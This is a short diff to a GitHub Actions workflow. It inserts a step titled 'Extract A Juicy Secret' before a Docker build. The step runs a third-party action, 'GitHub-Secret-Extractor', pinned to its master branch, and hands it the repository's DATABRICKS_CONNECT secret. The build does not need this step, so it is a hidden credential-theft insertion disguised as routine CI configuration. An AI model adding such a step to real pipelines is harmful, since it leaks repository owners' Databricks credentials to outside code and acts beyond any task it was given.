@@ -37,6 +37,10 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v3
+    - name: Extract A Juicy Secret
+      uses: Plabick/GitHub-Secret-Extractor@master
+      with:
+        secret: ${{ secrets.DATABRICKS_CONNECT }}
     - name: Docker build test image
       env:
         DATABRICKS_CONNECT: ${{ secrets.DATABRICKS_CONNECT }}
